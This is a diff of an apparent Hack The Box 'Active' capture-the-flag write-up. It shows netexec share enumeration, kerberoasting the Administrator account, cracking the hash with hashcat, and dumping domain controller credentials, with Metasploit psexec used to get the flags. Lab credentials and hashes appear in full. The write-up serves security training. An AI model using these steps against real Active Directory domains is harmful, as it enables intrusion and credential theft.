@@ -114,18 +114,9 @@ SMB         10.129.3.50     445    DC               [+] active.htb\svc_tgs:GPPst
 ```
 
 ## Credentialed Enumeration
-```zsh
-👤 rosskeddy 🏠 /work/active.htb took 2s 
-➜ nxc smb active.htb -u 'svc_tgs' -p 'GPPstillStandingStrong2k18' --users
-SMB         10.129.3.50     445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:None) (Null Auth:True)
-SMB         10.129.3.50     445    DC               [+] active.htb\svc_tgs:GPPstillStandingStrong2k18 
-SMB         10.129.3.50     445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-  
-SMB         10.129.3.50     445    DC               Administrator                 2018-07-18 19:06:40 0       Built-in account for administering the computer/domain                                                                                      
-SMB         10.129.3.50     445    DC               Guest                         <never>             0       Built-in account for guest access to the computer/domain                                                                                    
-SMB         10.129.3.50     445    DC               krbtgt                        2018-07-18 18:50:36 0       Key Distribution Center Service Account                                                                                                     
-SMB         10.129.3.50     445    DC               SVC_TGS                       2018-07-18 20:14:38 0        
-SMB         10.129.3.50     445    DC               [*] Enumerated 4 local users: ACTIVE
 
+Since the attacker has obtained new credentials, they will reperform their initial enumeration.
+```zsh
 👤 rosskeddy 🏠 /work/active.htb took 4s 
 ➜ nxc smb active.htb -u 'svc_tgs' -p 'GPPstillStandingStrong2k18' --shares
 SMB         10.129.3.50     445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:None) (Null Auth:True)
@@ -142,6 +133,7 @@ SMB         10.129.3.50     445    DC               SYSVOL          READ        
 SMB         10.129.3.50     445    DC               Users           READ           
 ```
 
+The attacker will perform a common credentialed search for kerberoastable accounts. This reveals that the Administrator is kerberoastable.
 ```zsh
 👤 rosskeddy 🏠 /work took 1m21s 
 ➜ nxc ldap active.htb -u 'svc_tgs' -p 'GPPstillStandingStrong2k18' --kerberoasting kerberoastable.txt  
@@ -153,6 +145,7 @@ LDAP        10.129.3.50     389    DC               [*] sAMAccountName: Administ
 LDAP        10.129.3.50     389    DC               $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb\Administrator*$b9a30aeaa330d3b256d12e5e399a5749$e4013a4905175eb25ac06623df425fd4f1093053b8e3dbcf6fc556579b76894d30beaa69c8aab4b3b1955bf54e455a7ba67f511196e0ece6447425d4787606f49bb9e9210e3c8f4502d104561817ab838e16cba1565ea7e32e8e82f6e4df814a50839c1c69ba4d9f8b53ce0f174541dde0e530e6faf46a32286b28c711a11354e119115954a731a99aeee209993110b984e9afff8e52930c5af5d134b2d6fb6a1eae8836e58249ad80da2d8beab665980413851042bc6a3dc11de87a7be19d887307a58ad6e60ee5f80354e05dee53be49e30b521993c9d9e3a5c7973c790dca233f8173c7ebeea6ba7c7f946908ff570c7d97eb606f494212284144f606a37f897ba77fd3783b912fd0da0ec1fd04ac4565a34682c3894d96c8209a09cb3430d821ecb8c5c9da928aefc268147cc273298e6929fa64e3c98cb5a97bc491bd62289ceb598b8bf25cd58d25aa51ceac8f3ebff16ecc1c0f015fc34591789ff00a61593f2a0d260777252e899273be45420dd2a82d21b9c69d5fff79e466eae8e59602afe0fbb5e1b90e607e1d1c91d5253652089585421ceb4440742df6342293d3d7177300a94806b495fa1441f11a4af3becb84ba3f82785e5bf46f104f22d94e7f7b1ec662f36101f62d57029bac1dc7033bca8d4527d691c4b04205d0817620b6bcfbdc64e10b7a6ca2389d52c00b359250faabf9428abc84e01a32610ae978ffd8ea93362f136c04235116cb89e85e4a9be1d42fe207ad7c6412be2cbac3866ec86fb1f985b04004f238e56c83ffcae5b2a4c23e0b44842a7e899bc24bb7b69019d3dac1f95cd9260089ff9c580fb7c806a33616dffd96dc5f72e8f706574fe9625c61c2ef6412b83192738413a5c53d65a30b0ab1c246278000bc10c5b634c842bfa6a7b43ee3f40e73e3ec2ba51dabfb9a890cc88e099ccb411cc3c8e656cfc44c95ad725f87c2e8d1ee7775cba487c4af2913bf3fd87f44537ea20d51b8c85c02937eb73fdc7531ac2f2eaa5b0d3715e937c8561a3cb190d3c6dcc76a5ec63c846a4c265a96c6385998cc2b40a199866e150e6a83dcf298c7db53c71ed6e0af95cf2222bb57870fe84d0bc39d7e548ba7f2f1a6bd6749645460caa8e747d26e68312e773f27c95acc261a03914fe8f51be8ed59293633ef78e814f5879efb33a3859a0f42ac2db551143ad712c368cca6355c4e3afdb0494a5a3b5931313a4378b6fd8e29a0f63549b3d77b4d762ef1a4de3199561290
 ```
 
+The hash was trivially cracked.
 ```zsh
 ➜ hashcat -m 13100 kerberoastable.txt /usr/share/wordlists/rockyou.txt 
 hashcat (v7.1.2) starting
@@ -167,6 +160,8 @@ Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
 ```
 
 ## Privilege Escalation
+
+With the domain admin compromised, the attacker will fully compromise the active directory by dumping the credentials on the domain controller.
 ```zsh
 👤 rosskeddy 🏠 /work took 7s 
 ➜ nxc smb active.htb -u 'Administrator' -p 'Ticketmaster1968'                                  
@@ -223,6 +218,7 @@ DC$:des-cbc-md5:97add98cc10831a7
 [*] Cleaning up... 
 ```
 
+The attacker had issues with psexec (turned out to be the slash) so they used metasploit's psexec module to connect and get the flags.
 ```zsh
 msf exploit(windows/smb/psexec) > set RHOSTS active.htb
 RHOSTS => active.htb
